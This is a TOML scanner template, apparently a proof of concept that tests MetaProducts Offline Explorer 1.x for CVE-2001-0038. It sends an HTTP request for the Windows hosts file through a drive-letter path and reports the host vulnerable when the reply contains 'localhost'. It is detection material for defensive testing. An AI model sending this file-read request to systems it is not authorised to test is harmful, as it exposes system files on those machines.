[info]
author = "ave"
description = "验证 MetaProducts Offline Explorer 1.x 文件系统信息泄露漏洞，通过向默认 HTTP 服务端口发起包含驱动器盘符路径的请求，检测是否存在任意文件读取"
id = "POC-AVE-2001-0019"
name = "CVE-2001-0038 PoC"
severity = "medium"
tags = ["ave-2001-0019"]
vuln_id = [
    "CVE-2001-0038",
    "AVE-2001-0019",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/C:/windows/system32/drivers/etc/hosts"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["localhost"]
